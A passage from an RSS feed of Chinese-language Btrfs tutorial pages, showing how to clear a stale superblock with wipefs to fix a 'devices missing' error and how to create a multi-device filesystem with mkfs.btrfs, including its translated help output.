<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">warning,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> missing</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WARNING:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> could</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> setup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> csum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tree,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> skipping</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> it</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b2daf230-bd04-4ca5-ac2f-2b7c4a8f1ac4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 256.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        ***</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Some</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> missing</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>问题解决</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># blkid</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">发现uuid被更改</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 清理旧的 super block </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# wipefs -o 0x10040  /dev/nvme0n4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/nvme0n4:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> were</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> erased</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> at</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> offset</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0x00010040</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (btrfs): 5f 42 48 52 66 53 5f 4d</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 144.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 264.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>参考连接</h2>
<p>https://btrfs.wiki.kernel.org/index.php/Problem_FAQ#I_can.27t_mount_my_filesystem.2C_and_I_get_a_kernel_oops.21</p>
<p>https://stackoverflow.com/questions/22390676/how-to-get-rid-of-some-devices-missing-in-btrfs-after-reuse-of-devices</p>
]]></content:encoded>
    </item>
    <item>
      <title>Btrfs使用和简介</title>
      <link>https://www.geekery.cn/note-book/Btrfs/Btrfs%E4%BD%BF%E7%94%A8%E5%92%8C%E7%AE%80%E4%BB%8B.html</link>
      <guid>https://www.geekery.cn/note-book/Btrfs/Btrfs%E4%BD%BF%E7%94%A8%E5%92%8C%E7%AE%80%E4%BB%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Btrfs使用和简介</source>
      <description>Btrfs使用和简介 了解了 btrfs 的特性，想必您一定想亲身体验一下 btrfs 的使用。本章将简要介绍如何使用 btrfs 。 创建文件系统 mkfs.btrfs 命令建立一个 btrfs 格式的文件系统。可以用如下命令在设备 nvme0n2,nvme0n3上建立一个 btrfs 文件系统，并将其挂载到 /mnt 目录下： 这样一个 Btrfs...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>了解了 btrfs 的特性，想必您一定想亲身体验一下 btrfs 的使用。本章将简要介绍如何使用 btrfs 。</p>
<h2>创建文件系统</h2>
<p>mkfs.btrfs 命令建立一个 btrfs 格式的文件系统。可以用如下命令在设备 nvme0n2,nvme0n3上建立一个 btrfs 文件系统，并将其挂载到 /mnt 目录下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mkfs.btrfs -f -L mydata /dev/nvme0n2 /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfs-progs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> v6.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">See</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://btrfs.wiki.kernel.org</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> more</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> information.</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">NOTE:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> several</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> settings</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> have</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> changed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 5.15,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> make</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sure</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> does</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> affect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> your</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> deployments:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DUP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> metadata</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (-m </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">dup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enabled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no-holes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (-O </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">no-holes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enabled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> free-space-tree</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (-R </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">free-space-tree</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">              mydata</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">               92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">          16384</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Sector</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        4096</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    40.00GiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Block</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> profiles:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Data:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">             single</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            8.00MiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Metadata:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         RAID1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           256.00MiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  System:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           RAID1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">             8.00MiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SSD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> detected:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       yes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Zoned</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       no</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Incompat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> features:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  extref,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> skinny-metadata,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no-holes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> features:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   free-space-tree</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Checksum:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           crc32c</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Devices:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   ID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  PATH</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /dev/nvme0n3</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 是</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --force的意思</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Labels</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mkfs.btrfs --help</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">用法：mkfs.btrfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [选项] dev [ dev ... ]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">选项：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   分配概况：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -d</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PROFILE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 数据配置文件，raid0,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid1c3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid1c4,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid5,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid6,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid10,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> single</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -m</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--metadata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PROFILE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 元数据配置文件，类似于数据配置文件的值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -M</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--mixed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将元数据和数据混合在一起</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   特征：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         --csum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 类型</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         --checksum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TYPE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 使用的校验和算法，crc32c（默认），xxhash，sha256，blake2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -n</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--nodesize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btree节点的大小</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--sectorsize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 数据块大小（当前内核可能无法挂载）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -O</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--features</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LIST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 逗号分隔的文件系统功能列表（使用“-O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list-all”列出功能）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -R</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--runtime-features</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LIST</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 逗号分隔的运行时特性列表（使用“-R</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list-all”列出运行时特性）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -L</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--label</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LABEL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设置文件系统标签</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--uuid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UUID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 指定文件系统的UUID（必须是唯一的）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   创建：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--byte-count</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将每个设备的大小设置为</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SIZE（文件系统大小是所有设备大小的总和）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -r</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--rootdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DIR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 从DIR复制文件到镜像根目录</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         --shrink</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (with </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">--rootdir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) 将填充的文件系统缩小到最小尺寸</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -K</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--nodiscard</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 不执行整个设备TRIM</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--force</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 强制覆盖现有文件系统</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   一般的：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -q</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--quiet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 除错误外没有消息</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -v</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--verbose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 增加详细级别，默认为1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -V</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 打印</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mkfs.btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 版本并退出</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         --help</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 打印帮助并退出</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   弃用：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         -l</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--leafsize</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SIZE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 在</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 6.0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 中移除，使用</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --nodesize</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mkfs.btrfs -O list-all</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">可用的文件系统功能：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mixed-bg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 混合数据和元数据块组（compat=2.6.37，safe=2.6.37）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">extref</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将每个文件的硬链接限制增加到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 65536（compat=3.7，safe=3.12，默认=3.12）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">raid56</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> raid56</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 扩展格式</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (compat=3.9)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">skinny-metadata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 减小大小的元数据范围</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> refs（compat=3.10，safe=3.18，default=3.18）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no-holes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 文件没有明确的洞范围（compat=3.14，safe=4.0，默认=5.15）</span></span>
